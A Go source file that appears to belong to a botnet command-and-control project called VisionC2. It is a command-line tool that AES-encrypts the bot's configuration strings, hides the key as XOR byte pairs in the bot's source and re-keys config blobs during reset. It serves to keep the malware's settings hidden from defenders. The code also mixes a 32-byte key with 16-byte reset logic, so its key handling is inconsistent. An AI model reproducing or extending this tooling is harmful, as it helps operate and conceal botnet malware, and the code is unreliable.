// For the most part you wont need this. Setup.py handles encryption and updates.
// crypto.go — Unified AES-256-CTR encrypt/decrypt tool for VisionC2.
// Uses the same 32-byte key derived from the XOR byte functions in opsec.go.
//
// Usage:
//   go run tools/crypto.go encrypt <string>            Encrypt a single string
//   go run tools/crypto.go encrypt-slice <a> <b> ...   Encrypt a string slice (null-separated)
//   go run tools/crypto.go decrypt <hex>               Decrypt a hex blob to string
//   go run tools/crypto.go decrypt-slice <hex>          Decrypt a hex blob to string slice
//   go run tools/crypto.go generate                    Generate all encrypted blobs for config.go
//   go run tools/crypto.go verify                      Verify config.go blobs decrypt correctly
//   go run tools/crypto.go resetconfig                 Reset key + blobs to zero-key source state

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"regexp"
	"strings"
)

// Must match the XOR byte functions in bot/opsec.go
// Patched by setup.py at build time — all zeros until then
var key = []byte{
	0x23 ^ 0x91, // mew         — patched by setup.py
	0xCB ^ 0xAA, // mewtwo      — patched by setup.py
	0x2C ^ 0x65, // celebi      — patched by setup.py
	0xC9 ^ 0x27, // jirachi     — patched by setup.py
	0x89 ^ 0x9C, // shaymin     — patched by setup.py
	0x92 ^ 0xD3, // phione      — patched by setup.py
	0xF0 ^ 0xA8, // manaphy     — patched by setup.py
	0x1E ^ 0x55, // victini     — patched by setup.py
	0x6F ^ 0x6E, // keldeo      — patched by setup.py
	0xE0 ^ 0x86, // meloetta    — patched by setup.py
	0x1B ^ 0x2F, // genesect    — patched by setup.py
	0xE2 ^ 0x71, // diancie     — patched by setup.py
	0xC8 ^ 0xD6, // hoopa       — patched by setup.py
	0xEE ^ 0x1F, // volcanion   — patched by setup.py
	0xD7 ^ 0xBC, // magearna    — patched by setup.py
	0x3D ^ 0x61, // marshadow   — patched by setup.py
	0x1A ^ 0x7E, // zeraora     — patched by setup.py
	0x44 ^ 0xC9, // zarude      — patched by setup.py
	0xFD ^ 0x1D, // regieleki   — patched by setup.py
	0x9F ^ 0xC4, // regidrago   — patched by setup.py
	0xD0 ^ 0xDE, // glastrier   — patched by setup.py
	0x8E ^ 0x16, // spectrier   — patched by setup.py
	0x97 ^ 0xCE, // calyrex     — patched by setup.py
	0xFB ^ 0xBB, // wyrdeer     — patched by setup.py
	0x0F ^ 0x35, // kleavor     — patched by setup.py
	0x6D ^ 0x78, // ursaluna    — patched by setup.py
	0xD3 ^ 0x43, // basculegion — patched by setup.py
	0x6A ^ 0x08, // sneasler    — patched by setup.py
	0x09 ^ 0xFC, // overqwil    — patched by setup.py
	0x7F ^ 0xA3, // enamorus    — patched by setup.py
	0x68 ^ 0x81, // tinkaton    — patched by setup.py
	0x8A ^ 0xAC, // annihilape  — patched by setup.py
}

// ============================================================================
// CORE ENCRYPT / DECRYPT
// ============================================================================

func encrypt(plaintext string) string {
	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalf("encrypt: aes.NewCipher: %v", err)
	}
	iv := make([]byte, aes.BlockSize)
	if _, err := rand.Read(iv); err != nil {
		log.Fatalf("encrypt: rand.Read: %v", err)
	}
	ct := make([]byte, len(plaintext))
	cipher.NewCTR(block, iv).XORKeyStream(ct, []byte(plaintext))
	return hex.EncodeToString(append(iv, ct...))
}

func decrypt(encrypted []byte) []byte {
	if len(encrypted) <= aes.BlockSize {
		return nil
	}
	iv := encrypted[:aes.BlockSize]
	ct := encrypted[aes.BlockSize:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	pt := make([]byte, len(ct))
	cipher.NewCTR(block, iv).XORKeyStream(pt, ct)
	return pt
}

func encryptSlice(items []string) string {
	return encrypt(strings.Join(items, "\x00"))
}

func mustHex(s string) []byte {
	b, err := hex.DecodeString(s)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: invalid hex string: %v\n", err)
		os.Exit(1)
	}
	return b
}

// ============================================================================
// VERIFY HELPERS
// ============================================================================

var verifyFails int

func check(name, hexBlob, expected string) {
	got := string(decrypt(mustHex(hexBlob)))
	if got == expected {
		fmt.Printf("OK   %-28s = %q\n", name, got)
	} else {
		fmt.Printf("FAIL %-28s\n  expected: %q\n  got:      %q\n", name, expected, got)
		verifyFails++
	}
}

func checkSlice(name, hexBlob string, expected []string) {
	got := strings.Split(string(decrypt(mustHex(hexBlob))), "\x00")
	joined := strings.Join(got, ", ")
	if len(got) == len(expected) && strings.Join(got, "\x00") == strings.Join(expected, "\x00") {
		display := joined
		if len(display) > 80 {
			display = display[:80] + "..."
		}
		fmt.Printf("OK   %-28s = [%d items] %s\n", name, len(got), display)
	} else {
		fmt.Printf("FAIL %-28s expected %d items, got %d\n", name, len(expected), len(got))
		verifyFails++
	}
}

// ============================================================================
// SUBCOMMANDS
// ============================================================================

func cmdEncrypt(args []string) {
	if len(args) < 1 {
		fmt.Fprintln(os.Stderr, "Usage: crypto encrypt <string>")
		os.Exit(1)
	}
	plaintext := strings.Join(args, " ")
	hexBlob := encrypt(plaintext)
	fmt.Println(hexBlob)
}

func cmdEncryptSlice(args []string) {
	if len(args) < 1 {
		fmt.Fprintln(os.Stderr, "Usage: crypto encrypt-slice <item1> <item2> ...")
		os.Exit(1)
	}
	hexBlob := encryptSlice(args)
	fmt.Println(hexBlob)
}

func cmdDecrypt(args []string) {
	if len(args) != 1 {
		fmt.Fprintln(os.Stderr, "Usage: crypto decrypt <hex>")
		os.Exit(1)
	}
	pt := decrypt(mustHex(args[0]))
	if pt == nil {
		fmt.Fprintln(os.Stderr, "Error: decryption failed (blob too short or invalid)")
		os.Exit(1)
	}
	fmt.Println(string(pt))
}

func cmdDecryptSlice(args []string) {
	if len(args) != 1 {
		fmt.Fprintln(os.Stderr, "Usage: crypto decrypt-slice <hex>")
		os.Exit(1)
	}
	pt := decrypt(mustHex(args[0]))
	if pt == nil {
		fmt.Fprintln(os.Stderr, "Error: decryption failed (blob too short or invalid)")
		os.Exit(1)
	}
	items := strings.Split(string(pt), "\x00")
	for i, item := range items {
		fmt.Printf("[%d] %s\n", i, item)
	}
}

func cmdGenerate() {
	fmt.Fprintln(os.Stderr, "generate is disabled — use setup.py to manage encrypted blobs")
	os.Exit(1)
}

func cmdVerify() {
	fmt.Fprintln(os.Stderr, "verify is disabled — use setup.py to manage encrypted blobs")
	os.Exit(1)
}

// ============================================================================
// RESETCONFIG — restore source to zero-key state
// ============================================================================

func aesEncrypt(plaintext, aesKey []byte) string {
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		log.Fatalf("aesEncrypt: aes.NewCipher: %v", err)
	}
	iv := make([]byte, aes.BlockSize)
	if _, err := rand.Read(iv); err != nil {
		log.Fatalf("aesEncrypt: rand.Read: %v", err)
	}
	ct := make([]byte, len(plaintext))
	cipher.NewCTR(block, iv).XORKeyStream(ct, plaintext)
	return hex.EncodeToString(append(iv, ct...))
}

func aesDecrypt(encrypted, aesKey []byte) []byte {
	if len(encrypted) <= aes.BlockSize {
		return nil
	}
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil
	}
	iv := encrypted[:aes.BlockSize]
	ct := encrypted[aes.BlockSize:]
	pt := make([]byte, len(ct))
	cipher.NewCTR(block, iv).XORKeyStream(pt, ct)
	return pt
}

var keyFuncNames = []string{
	"mew", "mewtwo", "celebi", "jirachi", "shaymin", "phione",
	"manaphy", "victini", "keldeo", "meloetta", "genesect",
	"diancie", "hoopa", "volcanion", "magearna", "marshadow",
}

func readKeyFromOpsec(path string) []byte {
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error reading %s: %v\n", path, err)
		os.Exit(1)
	}
	content := string(data)
	result := make([]byte, 16)
	for i, name := range keyFuncNames {
		pat := regexp.MustCompile(`func\s+` + name + `\s*\(\)\s*byte\s*\{\s*return\s+byte\(0x([0-9A-Fa-f]+)\s*\^\s*0x([0-9A-Fa-f]+)\)`)
		m := pat.FindStringSubmatch(content)
		if m == nil {
			fmt.Fprintf(os.Stderr, "Error: could not find XOR pair for %s in %s\n", name, path)
			os.Exit(1)
		}
		a, _ := hex.DecodeString(m[1])
		b, _ := hex.DecodeString(m[2])
		result[i] = a[0] ^ b[0]
	}
	return result
}

func patchOpsecZero(path string) {
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error reading %s: %v\n", path, err)
		os.Exit(1)
	}
	content := string(data)
	for _, name := range keyFuncNames {
		pat := regexp.MustCompile(`(func\s+` + name + `\s*\(\)\s*byte\s*\{\s*return\s+byte\()0x[0-9A-Fa-f]+\s*\^\s*0x[0-9A-Fa-f]+(\))`)
		content = pat.ReplaceAllString(content, "${1}0x00 ^ 0x00${2}")
	}
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		fmt.Fprintf(os.Stderr, "Error writing %s: %v\n", path, err)
		os.Exit(1)
	}
}

func patchCryptoToolZero(path string) {
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error reading %s: %v\n", path, err)
		os.Exit(1)
	}
	content := string(data)
	pat := regexp.MustCompile(`0x[0-9A-Fa-f]+\s*\^\s*0x[0-9A-Fa-f]+,(\s*//\s*\w+)`)
	content = pat.ReplaceAllString(content, "0x00 ^ 0x00,${1}")
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		fmt.Fprintf(os.Stderr, "Error writing %s: %v\n", path, err)
		os.Exit(1)
	}
}

func reencryptConfigBlobs(configPath string, oldKey, newKey []byte) {
	data, err := os.ReadFile(configPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error reading %s: %v\n", configPath, err)
		os.Exit(1)
	}
	content := string(data)
	pat := regexp.MustCompile(`(hex\.DecodeString\(")([0-9a-fA-F]+)("\))`)
	count := 0
	content = pat.ReplaceAllStringFunc(content, func(match string) string {
		m := pat.FindStringSubmatch(match)
		blob, err := hex.DecodeString(m[2])
		if err != nil {
			return match
		}
		plaintext := aesDecrypt(blob, oldKey)
		if plaintext == nil {
			return match
		}
		newBlob := aesEncrypt(plaintext, newKey)
		count++
		return m[1] + newBlob + m[3]
	})
	if err := os.WriteFile(configPath, []byte(content), 0644); err != nil {
		fmt.Fprintf(os.Stderr, "Error writing %s: %v\n", configPath, err)
		os.Exit(1)
	}
	fmt.Printf("Re-encrypted %d blobs\n", count)
}

func cmdResetConfig() {
	opsecPath := "bot/opsec.go"
	configPath := "bot/config.go"
	cryptoPath := "tools/crypto.go"

	currentKey := readKeyFromOpsec(opsecPath)
	zeroKey := make([]byte, 16)

	isZero := true
	for _, b := range currentKey {
		if b != 0 {
			isZero = false
			break
		}
	}
	if isZero {
		fmt.Println("Key is already zeroed — source is already in default state.")
		return
	}

	fmt.Printf("Current key: %s\n", hex.EncodeToString(currentKey))
	fmt.Println("Resetting to zero-key source state...")

	reencryptConfigBlobs(configPath, currentKey, zeroKey)
	patchOpsecZero(opsecPath)
	patchCryptoToolZero(cryptoPath)

	fmt.Println("Done. All files restored to zero-key default state.")
}

// ============================================================================
// MAIN
// ============================================================================

func usage() {
	fmt.Fprintf(os.Stderr, `Usage: go run tools/crypto.go <command> [args...]

Commands:
  encrypt <string>              Encrypt a plaintext string, output hex blob
  encrypt-slice <a> <b> ...     Encrypt multiple strings as null-separated slice
  decrypt <hex>                 Decrypt a hex blob to plaintext string
  decrypt-slice <hex>           Decrypt a hex blob to null-separated string slice
  generate                      Generate all encrypted blobs for config.go
  verify                        Verify config.go blobs decrypt correctly
  resetconfig                   Reset key + blobs to zero-key source state
`)
	os.Exit(1)
}

func main() {
	if len(os.Args) < 2 {
		usage()
	}

	// Warn if key is all zeros (setup.py hasn't been run yet)
	allZero := true
	for _, b := range key {
		if b != 0 {
			allZero = false
			break
		}
	}
	if allZero {
		fmt.Fprintln(os.Stderr, "WARNING: AES key is all zeros — run setup.py first to generate a real key")
	}

	cmd := os.Args[1]
	args := os.Args[2:]

	switch cmd {
	case "encrypt":
		cmdEncrypt(args)
	case "encrypt-slice":
		cmdEncryptSlice(args)
	case "decrypt":
		cmdDecrypt(args)
	case "decrypt-slice":
		cmdDecryptSlice(args)
	case "generate":
		cmdGenerate()
	case "verify":
		cmdVerify()
	case "resetconfig":
		cmdResetConfig()
	default:
		fmt.Fprintf(os.Stderr, "Unknown command: %s\n\n", cmd)
		usage()
	}
}
